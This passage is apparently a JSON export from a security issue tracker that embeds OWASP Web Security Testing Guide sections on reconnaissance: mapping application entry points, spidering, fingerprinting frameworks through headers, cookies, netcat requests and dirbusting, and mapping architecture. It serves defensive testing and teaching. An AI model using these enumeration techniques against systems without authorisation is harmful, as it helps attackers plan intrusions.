provide the source code itself.\n\n#### How to Use\n\nThe CLI jar file is available for download from [https://github.com/secdec/attack-surface-detector-cli/releases](https://github.com/secdec/attack-surface-detector-cli/releases).\nYou can run the following command for ASD to identify endpoints from the source code of the target web application.\n\u0060java -jar attack-surface-detector-cli-1.3.5.jar \u003Csource-code-path\u003E [flags]\u0060\nHere is an example of running the command against [OWASP RailsGoat](https://github.com/OWASP/railsgoat).\n\n\u0060\u0060\u0060\n$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for \u0027\u003C...\u003E/railsgoat\u0027 with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines \u00276\u0027-\u00279\u0027)\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines \u002733\u0027-\u002737\u0027)\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines \u002729\u0027-\u002738\u0027)\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines \u002719\u0027-\u002727\u0027)\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines \u00275\u0027-\u002717\u0027)\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines \u00276\u0027-\u00279\u0027)\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines \u002711\u0027-\u002731\u0027)\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines \u002733\u0027-\u002737\u0027)\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines \u00279\u0027-\u002711\u0027)\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines \u002713\u0027-\u002715\u0027)\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines \u00278\u0027-\u002713\u0027)\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines \u00276\u0027-\u00279\u0027)\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for \u0027\u003C...\u003E/railsgoat\u0027\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n\u0060\u0060\u0060\n\nYou can also generate a JSON output file using the \u0060-json\u0060 flag, which can be used by the plugin for both ZAP and Burp Suite. See the following links for more details.\n\n* [Home of ASD Plugin for ZAP](https://github.com/secdec/attack-surface-detector-zap/wiki)\n* [Home of ASD Plugin for PortSwigger Burp](https://github.com/secdec/attack-surface-detector-burp/wiki)\n\n### Testing for Application Entry Points\n\nThe following are two examples on how to check for application entry points.\n\n#### Example 1\n\nThis example shows a GET request that would purchase an item from an online shopping application.\n\n\u0060\u0060\u0060\nGET\u00A0/shoppingApp/buyme.asp?CUSTOMERID=100\u0026ITEM=z101a\u0026PRICE=62.50\u0026IP=x.x.x.x HTTP/1.1\nHost:\u00A0x.x.x.x\nCookie:\u00A0SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n\u0060\u0060\u0060\n\n\u003E All the parameters of the request such as CUSTOMERID, ITEM, PRICE, IP, and the Cookie, which could just be encoded parameters or parameters used for session state.\n\n#### Example 2\n\nThis example shows a POST request that would log you into an application.\n\n\u0060\u0060\u0060\nPOST\u00A0/example/authenticate.asp?service=login HTTP/1.1\nHost:\u00A0x.x.x.x\nCookie:\u00A0SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin\u0026pass=pass123\u0026debug=true\u0026fromtrustIP=true\n\u0060\u0060\u0060\n\nIt can be noted that the parameters are sent in several locations:\n\n1. In the query string: \u0060service\u0060\n2. In the Cookie header: \u0060SESSIONID\u0060, \u0060CustomCookie\u0060\n3. In the request body: \u0060user\u0060, \u0060pass\u0060, \u0060debug\u0060, \u0060fromtrustIP\u0060\n\nHaving a variety of injection locations provides the attacker with chaining possibilities that could improve the chances of finding a bug in the handling code.\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://www.portswigger.net/burp/)\n* [Fiddler](https://www.telerik.com/fiddler)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [RFC 2616 \u2013 Hypertext Transfer Protocol \u2013 HTTP 1.1](https://tools.ietf.org/html/rfc2616)\n* [OWASP Attack Surface Detector](https://owasp.org/www-project-attack-surface-detector/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-07 Map Execution Paths Through Application","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nBefore commencing security testing, understanding the structure of the application is paramount. Without a thorough understanding of the application\u2019s layout, a comprehensive test is unlikely.","TestingInstructions":"## Test Objectives\n\n* Map the target application and understand the principal workflows.\n\n## How to Test\n\nIn black-box testing, it is extremely difficult to test the entire codebase. This is not just because the tester cannot see the code paths through the application, but also because testing all the code paths would be extremely time-consuming. One way to reconcile this is to document the code paths that were discovered and tested.\nThere are several ways to approach the testing and measurement of code coverage:\n\n* **Path** \\- test each of the paths through an application that includes combinatorial and boundary value analysis testing for each decision path\\. While this approach offers thoroughness\\, the number of testable paths grows exponentially with each decision branch\\.\n* **Data Flow (or Taint Analysis)** \\- tests the assignment of variables via external interaction \\(normally users\\)\\. Focuses on mapping the flow\\, transformation and use of data throughout an application\\.\n* **Race** \\- tests multiple concurrent instances of the application manipulating the same data\\.\n\nThe choice of method and the extent to which each method is used should be negotiated with the application owner. Additionally, simpler approaches could be adopted. For example, the tester could ask the application owner about specific functions or code sections that they are particularly concerned about, and discuss how those code segments can be reached.\nTo demonstrate code coverage to the application owner, the tester can start by documenting all the links discovered from spidering the application (either manually or automatically) in a spreadsheet. The tester can then look more closely at decision points in the application and investigate how many significant code paths are discovered. These should then be documented in the spreadsheet with URLs, prose and screenshot descriptions of the paths discovered.\n\n### Automatic Spidering\n\nAn automatic spider is a tool that is used to discover new resources (URLs) on a specific site automatically. It begins with a list of URLs to visit, called the seeds, which depends on how the Spider is started. While there are a lot of Spidering tools, the following example uses the [Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy):\n![Zed Attack Proxy Screen](Image Not Found)\n*Figure 4.1.7-1: Zed Attack Proxy Screen*\n[ZAP](https://github.com/zaproxy/zaproxy) offers various automatic spidering options, which can be leveraged based on the tester\u2019s needs:\n\n* [Spider](https://www.zaproxy.org/docs/desktop/start/features/spider/)\n* [Ajax Spider](https://www.zaproxy.org/docs/desktop/addons/ajax-spider/)\n* [OpenAPI Support](https://www.zaproxy.org/docs/desktop/addons/openapi-support/)\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy)\n* [List of spreadsheet software](https://en.wikipedia.org/wiki/List_of_spreadsheet_software)\n* [Diagramming software](https://en.wikipedia.org/wiki/List_of_concept-_and_mind-mapping_software)\n\n\n","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Code Coverage](https://en.wikipedia.org/wiki/Code_coverage)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-08 Fingerprint Web Application Framework","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIt wouldn\u2019t be a stretch to say that almost every conceivable idea for a web application has already been put into development. With the vast number of free and open-source software projects that are actively developed and deployed globally, it is very likely that an application security test will encounter a target that is entirely or partly dependent on these well-known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested helps the testing process significantly and will also drastically reduce the effort required during the test. These well-known web applications have specific HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most web frameworks have several markers in these locations, which can assist an attacker or tester in recognizing them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy, several markers are usually used.","TestingInstructions":"## Test Objectives\n\n* Fingerprint the components used by the web applications.\n\n## How to Test\n\n### Black-Box Testing\n\nThere are several common locations to consider in order to identify frameworks or components:\n\n* HTTP headers\n* Cookies\n* HTML source code\n* Specific files and folders\n* File extensions\n* Error messages\n\n#### HTTP Headers\n\nThe most basic form of identifying a web framework is to look at the \u0060X-Powered-By\u0060 field in the HTTP response header. Many tools can be used to fingerprint a target, the simplest one is netcat.\nConsider the following HTTP Request-Response:\n\n\u0060\u0060\u0060\n$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n\u0060\u0060\u0060\n\nFrom the \u0060X-Powered-By\u0060 field, we understand that the web application framework is likely to be \u0060Mono\u0060. However, although this approach is simple and quick, this methodology doesn\u2019t work in all cases. It is possible to easily disable \u0060X-Powered-By\u0060 header by a proper configuration. There are also several techniques that allow a site to obfuscate HTTP headers (see an example in the [Remediation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework#remediation) section). In the example above, we can also note that a specific version of \u0060nginx\u0060 is being used to serve the content.\nIn the same example, the tester could either miss the \u0060X-Powered-By\u0060 header or obtain an answer like the following:\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n\u0060\u0060\u0060\n\nSometimes there are more HTTP headers that point at a certain framework. In the following example, according to the information from HTTP request, one can see that \u0060X-Powered-By\u0060 header contains PHP version. However, the \u0060X-Generator\u0060 header points out the used framework is actually \u0060Swiftlet\u0060, which helps a penetration tester to expand their attack vectors. When performing fingerprinting, carefully inspect every HTTP header for such leaks.\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet\n\u0060\u0060\u0060\n\n#### Cookies\n\nAnother similar and somewhat more reliable way to determine the current web framework are framework-specific cookies.\nConsider the following HTTP request:\n![Cakephp HTTP Request](Image Not Found)\n*Figure 4.1.8-7: Cakephp HTTP Request*\nThe cookie \u0060CAKEPHP\u0060 has automatically been set, which gives information about the framework being used. A list of common cookie names is presented in [Cookies](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework#cookies-1) section. Limitations still exist in relying on this identification mechanism - it is possible to change the name of cookies. For example, for the selected \u0060CakePHP\u0060 framework this could be done via the following configuration (excerpt from \u0060core.php\u0060):\n\n\u0060\u0060\u0060\n/**\n* The name of CakePHP\u0027s session cookie.\n*\n* Note the guidelines for Session names states: \u0022The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\u0022\n* @link http://php.net/session_name\n*/\nConfigure::write(\u0027Session.cookie\u0027, \u0027CAKEPHP\u0027);\n\u0060\u0060\u0060\n\nHowever, these changes are less likely to be made than changes to the \u0060X-Powered-By\u0060 header, making this approach to identification more reliable.\n\n#### HTML Source Code\n\nThis technique is based on finding certain patterns in the HTML page source code. Often one can find a lot of information which helps a tester to recognize a specific component. One of the common markers is HTML comments that directly lead to framework disclosure. More often, certain framework-specific paths can be found, i.e. links to framework-specific CSS or JS folders. Finally, specific script variables might also point to a certain framework.\nFrom the screenshot below, one can easily determine the framework in use and its version by the mentioned markers. The comment, specific paths and script variables can all help an attacker to quickly determine an instance of ZK framework.\n![ZK Framework Sample](Image Not Found)\n*Figure 4.1.8-2: ZK Framework HTML Source Sample*\nFrequently such information is positioned in the \u0060\u003Chead\u003E\u0060 section of HTTP responses, in \u0060\u003Cmeta\u003E\u0060 tags, or at the end of the page. Nevertheless, entire responses should be analyzed since it can be useful for other purposes such as inspection of other useful comments and hidden fields. Sometimes, web developers may not sufficiently obscure the information about the frameworks or components used. It is still possible to stumble upon something like this at the bottom of the page:\n![Banshee Bottom Page](Image Not Found)\n*Figure 4.1.8-3: Banshee Bottom Page*\n\n### Specific Files and Folders\n\nThere is another approach which greatly helps an attacker or tester to identify applications or components with high accuracy. Every web application component has its specific file and folder structure on the server. It has been noted that one can see the specific path from the HTML page source but sometimes they are not explicitly presented there and may still reside on the server.\nIn order to uncover them, a technique known as forced browsing or \u201Cdirbusting\u201D is used. Dirbusting is brute forcing a target with known folder and filenames and monitoring HTTP-responses to enumerate server content. This information can be used both for finding default files and attacking them, and for fingerprinting the web application. Dirbusting can be done in several ways, the example below shows a successful dirbusting attack against a WordPress-powered target with the help of defined list and intruder functionality of Burp Suite.\n![Dirbusting with Burp](Image Not Found)\n*Figure 4.1.8-4: Dirbusting with Burp*\nWe can see that for some WordPress-specific folders (for instance, \u0060/wp-includes/\u0060, \u0060/wp-admin/\u0060 and \u0060/wp-content/\u0060) HTTP responses are 403 (Forbidden), 302 (Found, redirection to\u00A0\u0060wp-login.php\u0060), and 200 (OK) respectively. This is a good indicator that the target is WordPress powered. The same way it is possible to dirbust different application plugin folders and their versions. In the screenshot below one can see a typical CHANGELOG file of a Drupal plugin, which provides information on the application being used and discloses a vulnerable plugin version.\n![Drupal Botcha Disclosure](Image Not Found)\n*Figure 4.1.8-5: Drupal Botcha Disclosure*\nTip: before starting with dirbusting, check the \u0060robots.txt\u0060 file first. Sometimes application specific folders and other sensitive information can be found there as well. An example of such a \u0060robots.txt\u0060 file is presented on a screenshot below.\n![Robots Info Disclosure](Image Not Found)\n*Figure 4.1.8-6: Robots Info Disclosure*\nSpecific files and folders are different for each specific application. If the identified application or component is Open Source there may be value in setting up a temporary installation during penetration tests in order to gain a better understanding of what infrastructure or functionality is presented, and what files might be left on the server. However, several useful file lists already exist; one notable example is the [FuzzDB wordlists of predictable files/folders](https://github.com/fuzzdb-project/fuzzdb).\n\n#### File Extensions\n\nURLs may include file extensions that can also help identify the web platform or technology.\nFor example, the OWASP wiki used PHP:\n\n\u0060\u0060\u0060\nhttps://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework\u0026action=edit\u0026section=4\n\u0060\u0060\u0060\n\nHere are some common web file extensions and associated technologies:\n\n* \u0060.php\u0060 \u2013 PHP\n* \u0060.aspx\u0060 \u2013 Microsoft ASP.NET\n* \u0060.jsp\u0060 \u2013 Java Server Pages\n\n#### Error Messages\n\nAs can be seen in the following screenshot the listed file system path points to use of WordPress (\u0060wp-content\u0060). Also, testers should be aware that WordPress is PHP-based (\u0060functions.php\u0060).\n![WordPress Parse error](Image Not Found)\n*Figure 4.1.8-7: WordPress Parse Error*\n\n## Common Identifiers\n\n### Cookies\n\n| Framework | Cookie name |\n| --------- | ----------- |\n| Zope | zope3 |\n| CakePHP | cakephp |\n| Kohana | kohanasession |\n| Laravel | laravel\\_session |\n| phpBB | phpbb3\\_ |\n| WordPress | wp-settings |\n| 1C-Bitrix | BITRIX\\_ |\n| AMPcms | AMP |\n| Django CMS | django |\n| DotNetNuke | DotNetNukeAnonymous |\n| e107 | e107\\_tz |\n| EPiServer | EPiTrace, EPiServer |\n| Graffiti CMS | graffitibot |\n| Hotaru CMS | hotaru\\_mobile |\n| ImpressCMS | ICMSession |\n| Indico | MAKACSESSION |\n| InstantCMS | InstantCMS[logdate] |\n| Kentico CMS | CMSPreferredCulture |\n| MODx | SN4[12symb] |\n| TYPO3 | fe\\_typo\\_user |\n| Dynamicweb | Dynamicweb |\n| LEPTON | lep[some\\_numeric\\_value]\u002Bsessionid |\n| Wix | Domain=.wix.com |\n| VIVVO | VivvoSessionId |\n\n### HTML Source Code\n\n| Application | Keyword |\n| ----------- | ------- |\n| WordPress | \u0060\u003Cmeta name=\u0022generator\u0022 content=\u0022WordPress 3.9.2\u0022 /\u003E\u0060 |\n| phpBB | \u0060\u003Cbody id=\u0022phpbb\u0022\u0060 |\n| Mediawiki | \u0060\u003Cmeta name=\u0022generator\u0022 content=\u0022MediaWiki 1.21.9\u0022 /\u003E\u0060 |\n| Joomla | \u0060\u003Cmeta name=\u0022generator\u0022 content=\u0022Joomla! - Open Source Content Management\u0022 /\u003E\u0060 |\n| Drupal | \u0060\u003Cmeta name=\u0022Generator\u0022 content=\u0022Drupal 7 (http://drupal.org)\u0022 /\u003E\u0060 |\n| DotNetNuke | \u0060DNN Platform - [http://www.dnnsoftware.com](http://www.dnnsoftware.com)\u0060 |\n\n#### General Markers\n\n* \u0060%framework_name%\u0060\n* \u0060powered by\u0060\n* \u0060built upon\u0060\n* \u0060running\u0060\n\n#### Specific Markers\n\n| Framework | Keyword |\n| --------- | ------- |\n| Adobe ColdFusion | \u0060\u003C!-- START headerTags.cfm\u0060 |\n| Microsoft ASP.NET | \u0060__VIEWSTATE\u0060 |\n| ZK | \u0060\u003C!-- ZK\u0060 |\n| Business Catalyst | \u0060\u003C!-- BC_OBNW --\u003E\u0060 |\n| Indexhibit | \u0060ndxz-studio\u0060 |\n\n## Remediation\n\nWhile efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc., such efforts boil down to \u201Csecurity through obscurity\u201D. System owners/administrators should recognize that such efforts only slow down the most rudimentary adversaries. The time and effort might be better spent on increasing stakeholder awareness and maintaining solutions.\n\n## Tools\n\nA list of general and well-known tools is presented below. There are also a lot of other utilities, as well as framework-based fingerprinting tools.\n\n### WhatWeb\n\nWebsite: [https://github.com/urbanadventurer/WhatWeb](https://github.com/urbanadventurer/WhatWeb)\nWhatWeb is one of the best open source fingerprinting tools currently available on the market and is included in the default [Kali Linux](https://www.kali.org/) build. Language: Ruby Matches for fingerprinting are made with:\n\n* Text strings (case sensitive)\n* Regular expressions\n* Google Hack Database queries (limited set of keywords)\n* MD5 hashes\n* URL recognition\n* HTML tag patterns\n* Custom ruby code for passive and aggressive operations\n\nSample output is presented on a screenshot below:\n![Whatweb Output sample](Image Not Found)\n*Figure 4.1.8-8: Whatweb Output sample*\n\n### Wappalyzer\n\nWebsite: [https://www.wappalyzer.com/](https://www.wappalyzer.com/)\nWappalyzer is available in multiple usage models, the most popular of which is likely the Firefox/Chrome extensions. They work largely on regular expression matching and don\u2019t need anything beyond the page being loaded in a browser. It works completely at the browser level and gives results in the form of icons. Although sometimes it has false positives, this is very handy to have notion of what technologies were used to construct a target site immediately after browsing a page.\nSample output of a plug-in is presented on a screenshot below.\n![Wappalyzer Output for OWASP Website](Image Not Found)\n*Figure 4.1.8-9: Wappalyzer Output for OWASP site*","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n### Whitepapers\n\n* [Saumil Shah: \u201CAn Introduction to HTTP fingerprinting\u201D](https://web.archive.org/web/20190526182734/https://net-square.com/httprint_paper.html)\n* [Anant Shrivastava : \u201CWeb Application Finger Printing\u201D](https://anantshri.info/articles/web_app_finger_printing.html)\n","Reference":null,"Vendor":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework","Product":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-09 Fingerprint Web Application","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This content has been merged into: [Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework).","TestingInstructions":null,"Details":"This content has been merged into: [Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework).","Implication":"This content has been merged into: [Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework).","Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"This content has been merged into: [Fingerprint Web Application Framework](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework).","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-10 Map Application Architecture","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn order to effectively test an application, and to be able to provide meaningful recommendations on how to address any of the issues identified, it is important to understand what one is actually testing. Additionally, it could be helpful to determine whether specific components should be considered out-of-scope for testing.\nModern web applications can vary significantly in complexity, from a simple script running on a single server to a highly complex application spread across dozens of different systems, languages and components. There may also be additional network-level components such as firewalls or intrusion protection systems that can have a significant impact on testing.","TestingInstructions":"## Test Objectives\n\n* Understand the architecture of the application and the technologies in use.\n\n## How to Test\n\nWhen testing from a black box perspective, it is important to try and build a clear picture of how the application works, and which technologies and components are in place. In some cases, it is possible to test for specific components such as a web application firewall, while other components can be identified by inspecting the behavior of the application.\nThe sections below provide a high-level overview of common architectural components, along with details on how they can be identified.\n\n### Application Components\n\n#### Web Server\n\nSimple applications may run on a single server, which can be identified using the steps discussed in the [Fingerprint Web Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server) section of the guide.\n\n#### Platform-as-a-Service (PaaS)\n\nIn a Platform-as-a-Service (PaaS) model, the web server and underlying infrastructure are managed by the service provider, and the customer is only responsible for the application that is deployed on them. From a testing perspective, there are two main differences:\n\n* The application owner has no access to the underlying infrastructure, which means they will be unable to directly remediate any issues\n* Infrastructure testing is likely to be out-of-scope for any engagements\n\nIn some cases, it is possible to identify the use of PaaS, as the application may use a specific domain name (for example, applications deployed on Azure App Services will have a \u0060*.azurewebsites.net\u0060 domain - although they may also use custom domains). In other cases, it is difficult to determine whether PaaS is in use.\n\n#### Serverless\n\nIn a Serverless model, the developers provide code which is directly run on a hosting platform as individual functions, rather than running a traditional larger web application deployed in a webroot. This makes it well suited for microservice-based architecture. As with a PaaS environment, infrastructure testing is likely to be out-of-scope.\nIn some cases, the use of Serverless code may be indicated by the presence of specific HTTP headers. For example, AWS Lambda functions will typically return the following headers:\n\n\u0060\u0060\u0060\nX-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n\u0060\u0060\u0060\n\nAzure Functions are less obvious. They typically return the \u0060Server: Kestrel\u0060 header - but this on its own is not enough to determine that it is an Azure App function, as it could be some other code running on Kestrel.\n\n#### Microservices\n\nIn a microservice-based architecture, the application API 